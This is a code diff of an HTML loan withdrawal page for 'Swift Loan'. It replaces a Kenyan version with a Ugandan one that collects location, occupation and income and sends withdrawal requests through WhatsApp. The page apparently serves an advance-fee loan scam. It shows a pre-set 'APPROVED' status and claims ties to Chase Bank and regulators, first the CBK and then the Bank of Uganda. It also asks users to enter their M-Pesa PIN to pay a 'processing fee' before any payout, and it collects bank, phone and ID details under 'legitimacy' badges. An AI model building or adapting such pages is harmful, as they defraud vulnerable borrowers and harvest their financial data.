+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                    <circle cx="12" cy="10" r="3"></circle>
+                                </svg>
+                                Location
+                            </h3>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="district">District <span class="required">*</span></label>
+                                    <input type="text" id="district" name="district" placeholder="e.g. Kampala" required>
+                                    <div class="error-message" id="districtError">Please enter your district</div>
+                                </div>
+                                <div class="form-group">
+                                    <label for="village">Village/Town <span class="required">*</span></label>
+                                    <input type="text" id="village" name="village" placeholder="e.g. Nakasero" required>
+                                    <div class="error-message" id="villageError">Please enter your village/town</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-section">
+                            <h3>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                                    <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                                </svg>
+                                Employment Information
+                            </h3>
+
+                            <div class="form-group">
+                                <label for="occupation">Occupation <span class="required">*</span></label>
+                                <select id="occupation" name="occupation" required>
+                                    <option value="">Select Occupation</option>
+                                    <option value="Employed">Employed (Full-time)</option>
+                                    <option value="Self-Employed">Self-Employed / Business Owner</option>
+                                    <option value="Part-Time">Part-Time Worker</option>
+                                    <option value="Farmer">Farmer</option>
+                                    <option value="Student">Student</option>
+                                    <option value="Other">Other</option>
+                                </select>
+                                <div class="error-message" id="occupationError">Please select your occupation</div>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="monthlyIncome">Monthly Income (UGX) <span class="required">*</span></label>
+                                <select id="monthlyIncome" name="monthlyIncome" required>
+                                    <option value="">Select Income Range</option>
+                                    <option value="Below 200,000">Below 200,000</option>
+                                    <option value="200,000 - 500,000">200,000 - 500,000</option>
+                                    <option value="500,000 - 1,000,000">500,000 - 1,000,000</option>
+                                    <option value="1,000,000 - 2,000,000">1,000,000 - 2,000,000</option>
+                                    <option value="Above 2,000,000">Above 2,000,000</option>
+                                </select>
+                                <div class="error-message" id="monthlyIncomeError">Please select your income range</div>
+                            </div>
+                        </div>
+
+                        <div class="summary-box">
+                            <h4>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <polyline points="9 11 12 14 22 4"></polyline>
+                                    <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
+                                </svg>
+                                Loan Summary
+                            </h4>
+                            <div class="summary-row">
+                                <span>Loan Amount:</span>
+                                <span id="summaryLoanAmount">UGX 0</span>
+                            </div>
+                            <div class="summary-row">
+                                <span>Processing Fee:</span>
+                                <span id="summaryFee">UGX 0</span>
+                            </div>
+                            <div class="summary-row">
+                                <span>Interest:</span>
+                                <span id="summaryInterest">UGX 0</span>
+                            </div>
+                            <div class="summary-row">
+                                <span>Amount You Receive:</span>
+                                <span id="summaryReceive" style="color: #166534;">UGX 0</span>
+                            </div>
+                            <div class="summary-row">
+                                <span>Total to Repay:</span>
+                                <span id="summaryRepay" style="color: var(--primary-orange);">UGX 0</span>
+                            </div>
+                        </div>
+
+                        <div class="terms-box">
+                            <p><strong>Important:</strong> By clicking the withdrawal button, you agree to receive your loan via Mobile Money.</p>
+                            <p>Ensure your Mobile Money account is active and registered in your name.</p>
+                            <p>Loan repayment is due on the date specified above. Late payments may incur additional fees.</p>
+                        </div>
+
+                        <div class="checkbox-wrapper">
+                            <input type="checkbox" id="termsCheckbox" required>
+                            <label for="termsCheckbox">
+                                I confirm that all information provided is accurate. I agree to the 
+                                <a href="#" onclick="return false;">Terms and Conditions</a>, 
+                                <a href="#" onclick="return false;">Privacy Policy</a>, and 
+                                <a href="#" onclick="return false;">Loan Agreement</a>.
+                            </label>
+                        </div>
+
+                        <button type="submit" class="withdraw-btn" id="withdrawBtn">
+                            <svg class="whatsapp-icon" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
+                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                            </svg>
+                            Request Withdrawal via WhatsApp
                         </button>
-                    </div>
-                    <div class="flex justify-center items-center space-x-8 mt-4">
-                        <div class="flex flex-col items-center">
-                            <div class="w-12 h-12 bg-primary rounded-lg flex items-center justify-center">
-                                <i class="fas fa-wallet text-white text-xl"></i>
-                            </div>
-                            <span class="text-xs text-gray-700 mt-1 font-medium">Swift Wallet</span>
-                        </div>
-                        <div class="flowing-arrows">
-                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
-                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
-                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
-                        </div>
-                        <div class="flex flex-col items-center">
-                            <div id="selectedMethodLogo" class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
-                                <i class="fas fa-mobile-alt text-white text-xl"></i>
-                            </div>
-                            <span id="selectedMethodName" class="text-xs text-gray-700 mt-1 font-medium">M-Pesa</span>
+
+                        <div class="security-note">
+                            <p>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                                </svg>
+                                Your information is secure and encrypted
+                            </p>
                         </div>
                     </div>
                 </div>
-            </div>
+            </form>
         </div>
 
-        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
-            <div class="flex items-center justify-between mb-6">
-                <h2 class="text-2xl font-bold swift-dark-blue">Loan Summary</h2>
-                <div class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">
-                    <i class="fas fa-check mr-1"></i> APPROVED
-                </div>
-            </div>
-            <div class="grid md:grid-cols-2 gap-8">
-                <div class="space-y-4">
-                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Customer Details</h3>
-                    <div class="space-y-3">
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Full Name:</span>
-                            <span id="customerName" class="font-semibold swift-dark-blue">Loading...</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Phone Number:</span>
-                            <span id="customerPhone" class="font-semibold swift-dark-blue">Loading...</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Loan ID:</span>
-                            <span id="loanId" class="font-semibold text-primary">Loading...</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="space-y-4">
-                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Loan Details</h3>
-                    <div class="space-y-3">
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Loan Amount:</span>
-                            <span id="loanAmount" class="font-bold text-green-600">Loading...</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-600">Processing Fee:</span>
-                            <span id="processingFee" class="font-semibold text-primary">Loading...</span>
-                        </div>
-                        <div class="flex justify-between pt-3 border-t border-gray-200">
-                            <span class="text-lg font-bold swift-dark-blue">Available Balance:</span>
-                            <span id="availableBalance" class="text-2xl font-bold text-primary">Loading...</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
-            <div class="text-center mb-8">
-                <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
-                    <i class="fas fa-money-bill-transfer text-primary text-2xl"></i>
-                </div>
-                <h2 class="text-2xl font-bold swift-dark-blue mb-2">Withdraw My Loan</h2>
-                <p class="text-gray-600">Choose your preferred withdrawal method and complete the process</p>
-            </div>
-
-            <div class="bg-gradient-to-r from-orange-50 to-orange-100 rounded-xl p-6 mb-8 text-center border-2 border-orange-200 shadow-sm">
-                <div class="flex items-center justify-center mb-3">
-                    <i class="fas fa-coins text-primary text-lg mr-2"></i>
-                    <div class="text-sm font-medium swift-dark-blue">Verified Withdrawal Amount</div>
-                </div>
-                <div id="withdrawalAmount" class="text-4xl font-bold text-primary mb-2">Loading...</div>
-                <div class="text-sm text-gray-600 mb-2">
-                    <i class="fas fa-info-circle mr-1"></i>
-                    <span id="feeNotice">Actual amount approved; withdrawable from account: [DDQTSU]</span>
-                </div>
-                <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
-                    <span><i class="fas fa-university mr-1"></i>Chase Bank LMTD</span>
-                    <span>•</span>
-                    <span><i class="fas fa-shield-alt mr-1"></i>Approved amount</span>
-                </div>
-            </div>
-
-            <div class="flex flex-col sm:flex-row gap-4">
-                <button onclick="goBack()" class="flex-1 px-8 py-4 border-2 border-gray-300 text-gray-700 font-semibold rounded-xl hover:bg-gray-50 transition-swift flex items-center justify-center">
-                    <i class="fas fa-arrow-left mr-2"></i>Cancel
-                </button>
-                <button onclick="showWithdrawalMethods()" id="withdrawBtn" class="flex-1 px-8 py-4 bg-gradient-to-r from-primary to-orange-600 text-white font-bold rounded-xl hover:from-primary-dark hover:to-orange-700 transition-swift flex items-center justify-center shadow-lg disabled:opacity-50 disabled:cursor-not-allowed">
-                    <i class="fas fa-wallet mr-2"></i>
-                    <span id="withdrawText">Choose Withdrawal Method</span>
-                </button>
-            </div>
-
-            <div class="mt-8 bg-orange-50 border border-orange-200 rounded-xl p-4">
-                <div class="flex items-start space-x-3">
-                    <i class="fas fa-info-circle text-primary mt-0.5 flex-shrink-0"></i>
-                    <div class="text-sm text-gray-700">
-                        <p class="font-semibold mb-2 swift-dark-blue">Important Information:</p>
-                        <ul class="space-y-1">
-                            <li>• Withdrawal is instant and secure</li>
-                            <li>• Ensure your account details are correct</li>
-                            <li>• Keep your transaction reference for records</li>
-                            <li>• Contact support if you face any issues</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="grid md:grid-cols-3 gap-6 mb-8">
-            <div class="text-center p-6 bg-white rounded-xl shadow-sm">
-                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                    <i class="fas fa-shield-alt text-green-600 text-xl"></i>
-                </div>
-                <h3 class="font-semibold swift-dark-blue mb-1">100% Secure</h3>
-                <p class="text-sm text-gray-600">Bank-level encryption</p>
-            </div>
-            <div class="text-center p-6 bg-white rounded-xl shadow-sm">
-                <div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-3">
-                    <i class="fas fa-bolt text-primary text-xl"></i>
-                </div>
-                <h3 class="font-semibold swift-dark-blue mb-1">Instant Transfer</h3>
-                <p class="text-sm text-gray-600">Real-time processing</p>
-            </div>
-            <div class="text-center p-6 bg-white rounded-xl shadow-sm">
-                <div class="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                    <i class="fas fa-headset text-blue-600 text-xl"></i>
-                </div>
-                <h3 class="font-semibold swift-dark-blue mb-1">24/7 Support</h3>
-                <p class="text-sm text-gray-600">Always here to help</p>
-            </div>
+        <div id="noDataMessage" class="withdrawal-card no-data-message" style="display: none;">
+            <h2>No Loan Selected</h2>
+            <p>It looks like you haven't selected a loan offer yet. Please go back to the offers page and choose a loan that suits your needs.</p>
+            <a href="offers.html">View Loan Offers</a>
         </div>
     </main>
 
-    <div id="withdrawalMethodModal" class="hidden fixed inset-0 z-50 items-center justify-center modal-overlay">
-        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
-            <div class="sticky top-0 bg-gradient-to-r from-primary to-orange-600 text-white p-6 rounded-t-2xl z-10">
-                <div class="flex items-center justify-between">
-                    <div>
-                        <h2 class="text-2xl font-bold">Select Withdrawal Method</h2>
-                        <p class="text-sm opacity-90 mt-1">Choose how you'd like to receive your funds</p>
-                    </div>
-                    <button onclick="closeWithdrawalModal()" class="text-white hover:bg-white/20 rounded-full p-2 transition">
-                        <i class="fas fa-times text-2xl"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="p-6 space-y-4">
-                <div class="method-card border-2 rounded-xl p-6 hover:shadow-lg transition" onclick="selectMethod('mpesa')">
-                    <div class="flex items-center space-x-4">
-                        <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                            <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
-                        </div>
-                        <div class="flex-1">
-                            <h3 class="font-bold text-lg swift-dark-blue mb-1">M-Pesa</h3>
-                            <p class="text-sm text-gray-600 mb-2">Direct transfer to your M-Pesa account</p>
-                            <div class="flex items-center space-x-4 text-xs text-gray-500">
-                                <span><i class="fas fa-bolt mr-1"></i>Instant</span>
-                                <span><i class="fas fa-shield-alt mr-1"></i>Secure</span>
-                                <span><i class="fas fa-check mr-1"></i>Most Popular</span>
-                            </div>
-                        </div>
-                        <i class="fas fa-chevron-right text-gray-400"></i>
-                    </div>
-                </div>
-                <div class="method-card border-2 rounded-xl p-6 hover:shadow-lg transition" onclick="selectMethod('airtel')">
-                    <div class="flex items-center space-x-4">
-                        <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
-                            <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
-                        </div>
-                        <div class="flex-1">
-                            <h3 class="font-bold text-lg swift-dark-blue mb-1">Airtel Money</h3>
-                            <p class="text-sm text-gray-600 mb-2">Transfer to your Airtel Money wallet</p>
-                            <div class="flex items-center space-x-4 text-xs text-gray-500">
-                                <span><i class="fas fa-clock mr-1"></i>2-3 minutes</span>
-                                <span><i class="fas fa-shield-alt mr-1"></i>Secure</span>
-                            </div>
-                        </div>
-                        <i class="fas fa-chevron-right text-gray-400"></i>
-                    </div>
-                </div>
-                <div class="method-card border-2 rounded-xl p-6 hover:shadow-lg transition" onclick="selectMethod('bank')">
-                    <div class="flex items-center space-x-4">
-                        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
-                            <i class="fas fa-university text-blue-600 text-2xl"></i>
-                        </div>
-                        <div class="flex-1">
-                            <h3 class="font-bold text-lg swift-dark-blue mb-1">Bank Transfer</h3>
-                            <p class="text-sm text-gray-600 mb-2">Direct transfer to your bank account</p>
-                            <div class="flex items-center space-x-4 text-xs text-gray-500">
-                                <span><i class="fas fa-clock mr-1"></i>3-5 minutes</span>
-                                <span><i class="fas fa-money-bill mr-1"></i>Higher limits</span>
-                            </div>
-                        </div>
-                        <i class="fas fa-chevron-right text-gray-400"></i>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="withdrawalDetailsModal" class="hidden fixed inset-0 z-50 items-center justify-center modal-overlay">
-        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-lg w-full mx-4 max-h-[90vh] overflow-y-auto">
-            <div class="sticky top-0 bg-gradient-to-r from-primary to-orange-600 text-white p-6 rounded-t-2xl z-10">
-                <div class="flex items-center justify-between">
-                    <h2 id="detailsModalTitle" class="text-xl font-bold">Withdrawal Details</h2>
-                    <button onclick="closeDetailsModal()" class="text-white hover:bg-white/20 rounded-full p-2 transition">
-                        <i class="fas fa-times text-xl"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="p-6">
-                <div id="withdrawalForm"></div>
-                <div class="flex gap-3 mt-6">
-                    <button onclick="closeDetailsModal()" class="flex-1 px-6 py-3 border-2 border-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-50 transition">Back</button>
-                    <button onclick="processWithdrawal()" id="processBtn" class="flex-1 px-6 py-3 bg-gradient-to-r from-primary to-orange-600 text-white font-bold rounded-lg hover:from-primary-dark hover:to-orange-700 transition shadow-lg">
-                        <i class="fas fa-paper-plane mr-2"></i>Withdraw Now
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="processingOverlay" class="hidden fixed inset-0 z-[100] flex items-center justify-center processing-overlay-enhanced">
-        <div class="text-center text-white px-6">
-            <div class="w-24 h-24 border-4 border-white border-t-transparent rounded-full mx-auto mb-6 processing-animation"></div>
-            <h3 class="text-2xl font-bold mb-2">Processing Your Fee Payment Request...</h3>
-            <p id="processingMessage" class="text-sm opacity-90 mb-4">Please wait while we securely process your transaction</p>
-            <div class="flex justify-center items-center space-x-2 legitimacy-indicator">
-                <i class="fas fa-shield-alt"></i>
-                <span class="text-xs">Secured by 256-bit encryption</span>
-            </div>
-        </div>
-    </div>
-
-    <div id="helpModal" class="hidden fixed inset-0 z-50 items-center justify-center modal-overlay">
-        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4">
-            <div class="bg-gradient-to-r from-primary to-orange-600 text-white p-6 rounded-t-2xl">
-                <div class="flex items-center justify-between">
-                    <h2 class="text-xl font-bold">Verify Transaction</h2>
-                    <button onclick="closeHelpModal()" class="text-white hover:bg-white/20 rounded-full p-2 transition">
-                        <i class="fas fa-times"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="p-6 space-y-4">
-                <p class="text-gray-700">Enter your M-Pesa transaction code to verify:</p>
-                <input type="text" id="mpesaCodeInput" placeholder="e.g. SGH7XYZABC" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-primary">
-                <button onclick="checkMpesaCode()" class="w-full px-4 py-3 bg-gradient-to-r from-primary to-orange-600 text-white font-bold rounded-lg">
-                    <i class="fas fa-search mr-2"></i>Verify Code
-                </button>
-                <div id="helpResult" class="mt-3"></div>
-                <div class="border-t pt-4 space-y-3">
-                    <p class="text-gray-700 font-medium">Or contact support:</p>
-                    <a href="tel:+254700000000" class="flex items-center space-x-3 p-4 bg-gray-50 rounded-lg hover:bg-gray-100 transition">
-                        <i class="fas fa-phone text-primary text-xl"></i>
-                        <div>
-                            <div class="font-semibold swift-dark-blue">Call Us</div>
-                            <div class="text-sm text-gray-600">+254 700 000 000</div>
-                        </div>
-                    </a>
-                    <a href="mailto:support@swiftloan.ke" class="flex items-center space-x-3 p-4 bg-gray-50 rounded-lg hover:bg-gray-100 transition">
-                        <i class="fas fa-envelope text-primary text-xl"></i>
-                        <div>
-                            <div class="font-semibold swift-dark-blue">Email Us</div>
-                            <div class="text-sm text-gray-600">support@swiftloan.ke</div>
-                        </div>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <footer class="bg-gray-50 border-t border-gray-200 py-8 mt-12">
-        <div class="max-w-4xl mx-auto px-4 text-center text-gray-600">
-            <div class="flex items-center justify-center space-x-4 mb-4">
-                <span class="text-sm">Powered by</span>
-                <div class="flex items-center space-x-1">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M3 6h18M3 12h18M3 18h18" stroke="#001F5C" stroke-width="2" stroke-linecap="round"/>
-                        <circle cx="12" cy="12" r="9" stroke="#FF6B00" stroke-width="1.5" fill="none"/>
-                    </svg>
-                    <span class="font-bold swift-dark-blue">CHASE BANK</span>
-                </div>
-                <span class="text-sm">Regulated by CBK</span>
-            </div>
-            <p class="text-xs text-gray-500">© 2024 Swift Loan. All rights reserved. | Licensed microfinance institution</p>
-        </div>
+    <footer class="footer">
+        <p>&copy; 2024 Swift Loan Limited. All rights reserved.</p>
+        <p>Licensed by Bank of Uganda | Regulated Microfinance Institution</p>
     </footer>
 
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <p>Processing your request...</p>
+        </div>
+    </div>
+
     <script>
-        let loanData = {};
-        let selectedWithdrawalMethod = '';
-        let isProcessing = false;
-        let receiptPollInterval = null;
-
-        const kenyanBanks = [
-            "Kenya Commercial Bank (KCB)", "Equity Bank", "Co-operative Bank of Kenya",
-            "Absa Bank Kenya", "Standard Chartered Kenya", "NCBA Bank", "Stanbic Bank",
-            "Diamond Trust Bank (DTB)", "I&M Bank", "Sidian Bank", "Prime Bank",
-            "Guardian Bank", "National Bank of Kenya", "Family Bank", "Bank of Africa Kenya",
-            "Credit Bank", "Housing Finance Company of Kenya (HF Group)", "Paramount Bank",
-            "Consolidated Bank of Kenya", "SBM Bank Kenya", "Kingdom Bank",
-            "Bank of Baroda Kenya", "Bank of India Kenya", "Citibank Kenya",
-            "Habib Bank AG Zurich", "Gulf African Bank", "First Community Bank",
-            "Mayfair Bank", "Middle East Bank Kenya", "Eco Bank Kenya", "UBA Kenya",
-            "ABC Bank", "Guaranty Trust Bank Kenya", "Victoria Commercial Bank Limited"
-        ];
-
-        function loadLoanData() {
-            try {
-                const selectedOffer = localStorage.getItem('swift_selected_offer');
-                const customerName = localStorage.getItem('swift_customer_name') || 'Applicant';
-                
-                if (!selectedOffer) {
-                    showError('No loan offer selected. Please go back and select a loan offer first.');
-                    document.getElementById('withdrawBtn').disabled = true;
-                    return;
-                }
-
-                loanData = JSON.parse(selectedOffer);
-                console.log('Loaded loan data:', loanData);
-
-                if (!loanData.amount || !loanData.fee || !loanData.phone || !loanData.tracking) {
-                    showError('Invalid loan data. Please go back and select a loan offer again.');
-                    document.getElementById('withdrawBtn').disabled = true;
-                    return;
-                }
-
-                const loanAmount = parseFloat(loanData.amount);
-                const feeAmount = parseFloat(loanData.fee);
-                const availableBalance = loanAmount - feeAmount;
-
-                document.getElementById('customerName').textContent = customerName;
-                document.getElementById('customerPhone').textContent = loanData.phone;
-                document.getElementById('loanId').textContent = loanData.tracking;
-                document.getElementById('loanAmount').textContent = `KES ${loanAmount.toLocaleString()}`;
-                document.getElementById('processingFee').textContent = `KES ${feeAmount.toLocaleString()}`;
-                document.getElementById('availableBalance').textContent = `KES ${availableBalance.toLocaleString()}`;
-                document.getElementById('withdrawalAmount').textContent = `KES ${availableBalance.toLocaleString()}`;
-
-                console.log('Loan data loaded successfully');
-            } catch (error) {
-                console.error('Error loading loan data:', error);
-                showError('Failed to load loan information. Please try again.');
-                document.getElementById('withdrawBtn').disabled = true;
-            }
-        }
-
-        function showWithdrawalMethods() {
-            document.getElementById('withdrawalMethodModal').classList.remove('hidden');
-            document.getElementById('withdrawalMethodModal').classList.add('flex');
-        }
-
-        function closeWithdrawalModal() {
-            document.getElementById('withdrawalMethodModal').classList.add('hidden');
-            document.getElementById('withdrawalMethodModal').classList.remove('flex');
-        }
-
-        function selectMethod(method) {
-            selectedWithdrawalMethod = method;
-            document.querySelectorAll('.method-card').forEach(card => card.classList.remove('selected'));
-            event.currentTarget.classList.add('selected');
-            setTimeout(() => {
-                closeWithdrawalModal();
-                showWithdrawalDetails(method);
-            }, 300);
-        }
-
-        function showWithdrawalDetails(method) {
-            const modal = document.getElementById('withdrawalDetailsModal');
-            const title = document.getElementById('detailsModalTitle');
-            const formContainer = document.getElementById('withdrawalForm');
+        document.addEventListener('DOMContentLoaded', function() {
+            const loanData = JSON.parse(localStorage.getItem('selectedLoan') || 'null');
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
             
-            let formHTML = '';
-            let titleText = '';
-
-            const bankOptions = kenyanBanks.map(bank => `<option value="${bank}">${bank}</option>`).join('');
-
-            switch(method) {
-                case 'mpesa':
-                    titleText = 'M-Pesa Withdrawal Details';
-                    formHTML = `
-                        <div class="space-y-4">
-                            <div class="text-center mb-6">
-                                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
-                                </div>
-                                <h4 class="text-lg font-semibold">M-Pesa Transfer</h4>
-                                <p class="text-sm text-gray-600">Enter your M-Pesa number to receive funds</p>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-mobile-alt mr-1"></i> M-Pesa Phone Number</label>
-                                <input type="tel" id="mpesaPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
-                                <div class="error-message hidden" id="mpesaPhoneError"></div>
-                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-user mr-1"></i> Account Name</label>
-                                <input type="text" id="mpesaName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
-                                <div class="error-message hidden" id="mpesaNameError"></div>
-                            </div>
-                            <div class="bg-green-50 border border-green-200 rounded-lg p-4">
-                                <div class="flex items-start space-x-2">
-                                    <i class="fas fa-info-circle text-green-600 mt-0.5"></i>
-                                    <div class="text-sm text-green-800">
-                                        <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
-                                        <ul class="text-xs space-y-1">
-                                            <li>• You will receive an STK push from SWIFTWALLET DIGITAL VENTURES</li>
-                                            <li>• Enter your M-Pesa PIN to complete fee payment</li>
-                                            <li>• Funds will be credited after confirmation</li>
-                                        </ul>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>`;
-                    break;
-                case 'airtel':
-                    titleText = 'Airtel Money Withdrawal Details';
-                    formHTML = `
-                        <div class="space-y-4">
-                            <div class="text-center mb-6">
-                                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                                    <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
-                                </div>
-                                <h4 class="text-lg font-semibold">Airtel Money Transfer</h4>
-                                <p class="text-sm text-gray-600">Enter your Airtel Money number</p>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-mobile-alt mr-1"></i> Airtel Money Phone Number</label>
-                                <input type="tel" id="airtelPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
-                                <div class="error-message hidden" id="airtelPhoneError"></div>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-user mr-1"></i> Account Name</label>
-                                <input type="text" id="airtelName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="Enter full name" value="${localStorage.getItem('swift_customer_name') || ''}">
-                                <div class="error-message hidden" id="airtelNameError"></div>
-                            </div>
-                        </div>`;
-                    break;
-                case 'bank':
-                    titleText = 'Bank Transfer Details';
-                    formHTML = `
-                        <div class="space-y-4">
-                            <div class="text-center mb-6">
-                                <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                                    <i class="fas fa-university text-blue-600 text-2xl"></i>
-                                </div>
-                                <h4 class="text-lg font-semibold">Bank Transfer</h4>
-                                <p class="text-sm text-gray-600">Enter your bank account details</p>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-university mr-1"></i> Select Bank</label>
-                                <select id="bankName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none">
-                                    <option value="">-- Select Your Bank --</option>
-                                    ${bankOptions}
-                                </select>
-                                <div class="error-message hidden" id="bankNameError"></div>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-hashtag mr-1"></i> Account Number</label>
-                                <input type="text" id="accountNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="Enter account number">
-                                <div class="error-message hidden" id="accountNumberError"></div>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-user mr-1"></i> Account Holder Name</label>
-                                <input type="text" id="accountName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="Enter account holder name" value="${localStorage.getItem('swift_customer_name') || ''}">
-                                <div class="error-message hidden" id="accountNameError"></div>
-                            </div>
-                            <div>
-                                <label class="block text-sm font-medium text-gray-700 mb-2"><i class="fas fa-id-card mr-1"></i> ID Number</label>
